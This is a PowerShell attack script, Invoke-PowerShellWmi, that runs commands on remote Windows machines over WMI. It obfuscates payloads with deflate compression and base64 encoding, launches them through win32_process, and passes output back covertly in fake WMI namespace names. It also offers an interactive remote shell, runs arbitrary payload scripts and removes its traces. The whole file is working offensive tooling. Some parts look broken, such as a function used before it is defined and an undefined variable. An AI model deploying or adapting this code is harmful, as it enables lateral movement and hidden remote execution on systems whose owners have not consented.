function Invoke-PowerShellWmi{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias("IPAddress")]
        [String]
        $ComputerName,
        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $UserName = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Payload,
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $PayloadScript,
        [Parameter()]
        [Switch]
        $Interactive,
        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $Namespace = "root\default",
        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $Tag = "SYSINFOS"
    )
    function Execute-WmiCommand ($RemotePayload)
    {
        Write-Verbose "Sending given command to a scriptblock"
        $RemoteScript = @"
        Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
        `$WScriptShell = New-Object -c WScript.Shell
        function Insert-Piece(`$i, `$piece) {
            `$Count = `$i.ToString()
	        `$Zeros = "0" * (6 - `$count.Length)
	        `$Tag = "$Tag" + `$Zeros + `$count
	        `$Piece = `$Tag + `$piece + `$Tag
	        Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
        }
	        `$ShellExec = `$WScriptShell.Exec("$RemotePayload") 
	        `$ShellOutput = `$ShellExec.StdOut.ReadAll()
            `$WmiEncoded = ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$ShellOutput))) -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
            `$NumberOfPieces = [Math]::Floor(`$WmiEncoded.Length / 5500)
            if (`$WmiEncoded.Length -gt 5500) {
                `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
                `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
                for(`$i = 1; `$i -le `$NumberOfPieces; `$i++) { 
	                `$piece = `$WmiEncoded.Substring(0,5500)
		            `$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
		            Insert-Piece `$i `$piece
                }
                `$WmiEncoded = `$LastPiece
            }
	        Insert-Piece (`$NumberOfPieces + 1) `$WmiEncoded 
	        Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
"@
            Write-Verbose "Creating Scriptblock to execute on $ComputerName"
            $ScriptBlock = [scriptblock]::Create($RemoteScript)
            $ms = New-Object IO.MemoryStream
            $action = [IO.Compression.CompressionMode]::Compress
            $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
            $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
            $ScriptBlock | ForEach-Object {$sw.WriteLine($_)}
            $sw.Close()
            $Compressed = [Convert]::ToBase64String($ms.ToArray())
            $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
            "`$(New-Object IO.Compression.DeflateStream (" +
            "`$(New-Object IO.MemoryStream (,"+
            "`$([Convert]::FromBase64String('$Compressed')))), " +
            "[IO.Compression.CompressionMode]::Decompress)),"+
            " [Text.Encoding]::ASCII)).ReadToEnd();"
            $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
            $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
            if (($EncScript.Length -gt 8190) -or ($PostScriptCommand -eq $True))
            {
                $EncodedScript = $Command
            }
            else
            {
                $EncodedScript = $EncScript
            }
            $EncodedPosh = "powershell.exe -e $EncodedScript"
            Write-Verbose "Executing scriptblock on $ComputerName"
            Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh | Out-Null
            $outputReady = ""
            do
            {
                Write-Verbose "Waiting for the scriptblock on $ComputerName to finish executing."
                $outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"
            }
            until($outputReady)
            Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
            Write-Verbose "Retrieving command output" 
            Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Namespace $Namespace -Tag $Tag
    }
    if ($Interactive)
    {
        $Command = ""
        $Shell = "powershell -noprofile -c "
        do{ 
            Write-Host ("[" + $($ComputerName) + "]: > ") -nonewline -foregroundcolor green 
            $Command = Read-Host
            switch ($Command) {
                "exit" { 
                    Write-Verbose "Cleaning up the target system"
                    Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                }
                default { 
                    Execute-WmiCommand "$Command" + "$Shell"
                }
            }
        }until($Command -eq "exit")
    }
    elseif ($Payload)
    {
        Execute-WmiCommand $Payload
        Write-Verbose "Cleaning up the target system"
        Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
    }
    elseif ($PayloadScript)
    {
        $Enc = Get-Content $PayloadScript -Encoding Ascii
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $Enc | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
        "`$(New-Object IO.Compression.DeflateStream (" +
        "`$(New-Object IO.MemoryStream (,"+
        "`$([Convert]::FromBase64String('$Compressed')))), " +
        "[IO.Compression.CompressionMode]::Decompress)),"+
        " [Text.Encoding]::ASCII)).ReadToEnd();"
        $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
        $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
        $Payload = "powershell -noprofile -e $EncScript"
        Execute-WmiCommand $Payload
        Write-Verbose "Cleaning up the target system"
        Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
    }
    function Get-WmiShellOutput
    {
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $ComputerName,
            [Parameter(Position = 1, Mandatory = $False)]
            [ValidateNotNull()]
            [System.Management.Automation.PSCredential]
            [System.Management.Automation.Credential()]
            $UserName = [System.Management.Automation.PSCredential]::Empty,
            [Parameter(Position = 2, Mandatory = $False)]
            [String]
            $Namespace = "root\default",
            [Parameter(Position = 3, Mandatory = $False)]
            [String]
            $Tag
        ) 
	    $GetOutput = @() 
	    $GetOutput = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
                        -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
	    if ([BOOL]$GetOutput.Length) 
        {
	        $Reconstructed = New-Object System.Text.StringBuilder
            Write-Verbose "Decoding the encoded output."
		    foreach ($line in $GetOutput) 
            {
			    $WmiToBase64 = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
                $WmiToBase64 = $WmiToBase64.Remove($WmiToBase64.Length - 14, 14)
	            $null = $Reconstructed.Append($WmiToBase64)
            }
            if ($Reconstructed.ToString().Length % 4 -ne 0) 
            { 
                $null = $Reconstructed.Append(("===").Substring(0, 4 - ($Reconstructed.ToString().Length % 4))) 
            }
            $Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Reconstructed.ToString()))
            Write-Output $Decoded
        }	
	    else 
        { 
		    $GetOutput
            $GetString = $GetOutput.Name
		    $WmiToBase64 = $GetString.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
		    if ($WmiToBase64.length % 4 -ne 0) 
            { 
                $WmiToBase64 += ("===").Substring(0,4 - ($WmiToBase64.Length % 4)) 
            }
            $DecodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($WmiToBase64))
		    Write-Output $DecodedOutput    
        }
    }
}
